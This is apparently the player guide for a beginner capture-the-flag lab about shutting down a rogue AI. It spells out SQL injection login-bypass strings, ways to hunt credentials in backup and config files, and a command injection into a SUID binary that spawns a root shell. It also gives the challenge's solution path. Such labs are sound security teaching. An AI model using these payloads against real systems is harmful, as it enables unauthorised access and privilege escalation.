# 🤖 ROGUE.AI: The ARTEMIS Incident - Player Guide

## 🎯 Mission Briefing

**CLASSIFIED - SECURITY LEVEL: ALPHA**

ARTEMIS, our state-of-the-art AI security system, has gone rogue. It has initiated unauthorized lockdown protocols and seized control of our critical infrastructure. We've lost all administrative access to the system.

**Your Mission:** Infiltrate the ARTEMIS system, escalate your privileges, and shut down the rogue AI before it's too late.

**Clearance Level:** All methods authorized to regain control

---

## 🚀 Getting Started

### Connection Information
- **Web Portal:** `http://localhost:5000` (or provided IP)
- **SSH Access:** `ssh ctfuser@localhost -p 2222` (credentials to be discovered)

### Your Goal
Find **5 flags** throughout the challenge. Each flag follows the format: `CTF{...}`

---

## 💡 Hints & Tips

### Stage 1: Initial Reconnaissance
- Visit the web portal
- Look for any information displayed on the main page
- The first flag is visible to everyone

### Stage 2: Gaining Access
The login system might have security vulnerabilities. Common attack vectors include:
- **Default Credentials:** Try common usernames like `guest`, `admin`
- **SQL Injection:** The login form might be vulnerable to SQL injection
  - Try entering: `' OR '1'='1` in the username field
  - Or: `admin'--` to comment out the password check

**Beginner Tip:** SQL injection works by manipulating database queries. The `'` character breaks out of the string, and `OR '1'='1` makes the condition always true.

### Stage 3: Exploring the System
Once logged in:
- Explore all available pages
- Check the **System Logs** (might need admin privileges)
- Browse the **File Browser** for interesting files
- Look for configuration files that might contain credentials

**What to look for:**
- `.bak` files (backup files often contain sensitive data)
- `config` files
- Any files with "password" or "credentials" in their content

### Stage 4: SSH Access
After finding SSH credentials in the web interface:
```bash
ssh ctfuser@localhost -p 2222
# Enter the password you discovered
```

Once inside:
- Run `ls -la` to see all files (including hidden ones)
- Check the `.bash_history` file for clues
- Read any text files in the home directory

### Stage 5: Privilege Escalation
You need to become root to access the final flags. Common techniques:

**Find SUID Binaries:**
```bash
find / -perm -4000 2>/dev/null
```

SUID binaries run with the owner's permissions (often root). Look for unusual ones in `/usr/local/bin`.

**Exploiting Vulnerable Binaries:**
If you find a vulnerable binary (like `backup_tool`), try command injection using special characters: `;`, `&&`, `|`

**Important:** To get a proper ROOT SHELL from a SUID binary, use the `-p` flag with bash:
```bash
backup_tool "; /bin/bash -p"
```

**What the -p flag does:** It tells bash to run in "privileged mode", which preserves the SUID permissions. Without `-p`, bash might drop privileges!

**Beginner Tip:** The semicolon `;` lets you run multiple commands. So `cat file; /bin/bash -p` runs two commands: first cat (which may fail), then spawns a root shell.

Once you have a root shell:
```bash
whoami          # Should show 'root'
ls -la /root/   # List ALL files (including hidden ones starting with .)
```

### Stage 6: Final Challenge
As root, explore `/root/` directory. You'll find:
- `flag4.txt` - A hint file (not the real flag!)
- `.flag4.txt` - Hidden file with the REAL FLAG 4
- `artemis_shutdown.enc` - Encrypted shutdown codes
- `decrypt_tool.py` - Python script to decrypt

Run the decryption tool to get the final flag:
```bash
python3 /root/decrypt_tool.py
```

---

## 🔧 Useful Commands

### Linux Basics
```bash
ls -la              # List all files (including hidden)
cat filename        # Display file contents
cd directory        # Change directory
pwd                 # Print current directory
whoami              # Show current user
id                  # Show user ID and groups
```

### Finding Files
```bash
find / -name "*.txt" 2>/dev/null    # Find all .txt files
grep -r "password" .                 # Search for "password" in files
```

### Privilege Escalation
```bash
sudo -l                              # Check sudo permissions
find / -perm -4000 2>/dev/null       # Find SUID binaries
ls -la /usr/local/bin                # Check local binaries
```

### Web Exploitation
```
SQL Injection examples:
- ' OR '1'='1
- admin'--
- ' OR 1=1--
```

---

## 📚 Learning Resources

### SQL Injection
- SQL injection bypasses authentication by manipulating database queries
- The `--` characters comment out the rest of the SQL query
- `OR '1'='1` creates a condition that's always true

### SUID Binaries
- SUID (Set User ID) allows a program to run with the file owner's permissions
- If a SUID binary owned by root has vulnerabilities, you can gain root access
- Command injection happens when user input is passed to system commands unsafely

### Linux Privilege Escalation
- Always check for SUID binaries first
- Look for writable files in important directories
- Check sudo permissions with `sudo -l`
- Examine running processes for opportunities

---

## 🎓 Challenge Progression

1. ✅ **FLAG 1:** Found on the main web page
2. 🔓 **FLAG 2:** Requires successful SQL injection or admin login
3. 📁 **FLAG 3:** Found in configuration files (web interface)
4. 🔑 **FLAG 4:** Requires SSH access and privilege escalation to root
5. 🏆 **FLAG 5:** Decrypt the AI shutdown codes as root

---

## ❓ Stuck? Here's More Help

### Can't login to the web interface?
Try SQL injection: `' OR '1'='1` in the username, leave password blank

### Can't see system logs?
You need admin privileges. Use SQL injection to login as admin or bypass authentication entirely.

### Found SSH credentials but can't connect?
Make sure you're using the correct port: `-p 2222`
```bash
ssh ctfuser@localhost -p 2222
```

### Can't escalate privileges?
1. Look for SUID binaries: `find / -perm -4000 2>/dev/null`
2. Check the NOTES.txt file in the home directory
3. Try the backup_tool: `backup_tool "/root/flag4.txt"`
4. Use command injection: `backup_tool "/etc/passwd; /bin/bash"`

### Can't decrypt the final flag?
Make sure you're root first, then:
```bash
cd /root
python3 decrypt_tool.py
```

---

## 🏁 Victory Conditions

You've successfully completed the challenge when you've:
- [✓] Found all 5 flags
- [✓] Successfully performed SQL injection
- [✓] Gained SSH access
- [✓] Escalated privileges to root
- [✓] Decrypted the ARTEMIS shutdown codes

---

## 🎉 Congratulations!

If you've made it this far, you've learned:
- Web exploitation (SQL injection)
- Reconnaissance and file discovery
- Linux command line basics
- Privilege escalation techniques
- Basic cryptography

These are fundamental skills in cybersecurity and ethical hacking. Keep learning and practicing!

---

**Remember:** This is a controlled environment for learning. Never use these techniques on systems you don't own or have explicit permission to test!

**Good luck, and happy hacking! 🚀**
